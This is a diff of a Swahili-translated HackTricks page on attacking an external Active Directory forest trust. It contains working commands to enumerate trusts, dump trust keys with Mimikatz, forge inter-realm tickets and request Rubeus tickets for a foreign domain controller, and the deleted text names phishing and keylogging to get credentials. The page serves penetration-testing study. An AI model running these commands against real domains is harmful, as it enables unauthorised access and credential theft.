@@ -1,22 +1,25 @@
-# Kikoa cha Msitu wa Nje - Mwelekeo Mmoja (Kuingia) au wa pande mbili
+# External Forest Domain - OneWay (Inbound) or bidirectional
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-Katika hali hii, kikoa cha nje kinakuamini (au vyote viwili vinakuamini), hivyo unaweza kupata aina fulani ya ufikiaji juu yake.
+Katika hali hii, kikoa cha nje kinakutegemea (au wote wanategemeana), hivyo unaweza kupata aina fulani ya ufikiaji juu yake.
 
-## Uchunguzi
+## Enumeration
 
-Kwanza kabisa, unahitaji **kuchunguza** **imani**:
+Kwanza kabisa, unahitaji **kuhesabu** **imani**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -66,13 +69,13 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Katika uchunguzi uliopita iligundulika kuwa mtumiaji **`crossuser`** yuko ndani ya kikundi cha **`External Admins`** ambacho kina **upatikanaji wa Msimamizi** ndani ya **DC ya kikoa cha nje**.
+Katika uainishaji wa awali, iligundulika kwamba mtumiaji **`crossuser`** yuko ndani ya kundi la **`External Admins`** ambalo lina **upatikanaji wa Admin** ndani ya **DC ya eneo la nje**.
 
 ## Upatikanaji wa Awali
 
-Ikiwa hukupata upatikanaji wa **maalum** wa mtumiaji wako katika kikoa kingine, bado unaweza kurudi kwenye Methodolojia ya AD na jaribu **privesc kutoka kwa mtumiaji asiye na mamlaka** (vitu kama kerberoasting kwa mfano):
+Ikiwa hujaweza kupata **upatikanaji maalum** wa mtumiaji wako katika eneo lingine, bado unaweza kurudi kwenye Mbinu za AD na kujaribu **privesc kutoka kwa mtumiaji asiye na mamlaka** (mambo kama kerberoasting kwa mfano):
 
-Unaweza kutumia **Powerview functions** kwa **uchambuzi** wa **kikoa kingine** kwa kutumia paramu ya `-Domain` kama ifuatavyo:
+Unaweza kutumia **Powerview functions** ili **kuainisha** **eneo lingine** kwa kutumia param ya `-Domain` kama ilivyo:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -80,28 +83,28 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 [.](./)
 {% endcontent-ref %}
 
-## Uwakilishi
+## Uigaji
 
 ### Kuingia
 
-Kwa kutumia njia ya kawaida na sifa za watumiaji ambao wana ufikiaji wa kikoa cha nje, unapaswa kuweza kupata:
+Kwa kutumia njia ya kawaida na akidi za watumiaji ambao wana ufikiaji wa eneo la nje unapaswa kuwa na uwezo wa kufikia:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### Matumizi Mabaya ya Historia ya SID
+### SID History Abuse
 
-Unaweza pia kutumia [**Historia ya SID**](sid-history-injection.md) kwenye uaminifu wa misitu.
+Unaweza pia kutumia [**SID History**](sid-history-injection.md) kupitia uaminifu wa msitu.
 
-Ikiwa mtumiaji amehamishiwa **kutoka msitu mmoja hadi mwingine** na **Uchujaji wa SID haujaanzishwa**, inawezekana **kuongeza SID kutoka msitu mwingine**, na hii **SID** itaongezwa kwenye **kitufe cha mtumiaji** wakati wa kuthibitisha **katika uaminifu**.
+Ikiwa mtumiaji anahamishwa **kutoka msitu mmoja hadi mwingine** na **SID Filtering haijawashwa**, inakuwa inawezekana **kuongeza SID kutoka msitu mwingine**, na hii **SID** itakuwa **imeongezwa** kwenye **token ya mtumiaji** wakati wa uthibitishaji **kupitia uaminifu**.
 
 {% hint style="warning" %}
-Kama ukumbusho, unaweza kupata ufunguo wa kusaini na
+Kumbuka, unaweza kupata funguo ya kusaini na
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Unaweza **saini na** ufunguo **unaouaminika** TGT ukiiga mtumiaji wa kikoa cha sasa.
+Unaweza **kusaini na** funguo **iliyoaminika** **TGT ikijifanya** mtumiaji wa eneo la sasa.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -113,22 +116,6 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
 ### Njia kamili ya kujifanya kuwa mtumiaji
-
-To impersonate a user in an external forest domain, follow these steps:
-
-1. Obtain the user's credentials: This can be done through various methods such as phishing, keylogging, or password cracking.
-
-2. Establish a connection to the domain controller (DC) of the external forest domain: Use tools like `mimikatz` or `lsadump` to extract the NTLM hash or plaintext password of the user.
-
-3. Pass the user's credentials to the DC: Use tools like `mimikatz` or `pth-winexe` to pass the obtained credentials to the DC.
-
-4. Obtain a Kerberos ticket-granting ticket (TGT): Use tools like `mimikatz` or `kekeo` to request a TGT for the user from the DC.
-
-5. Generate a Kerberos service ticket: Use tools like `mimikatz` or `kekeo` to generate a service ticket for the desired service using the obtained TGT.
-
-6. Use the generated service ticket: Pass the service ticket to the desired service to gain access as the impersonated user.
-
-By following these steps, you can fully impersonate a user in an external forest domain and gain unauthorized access to resources within that domain.
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -142,14 +129,17 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
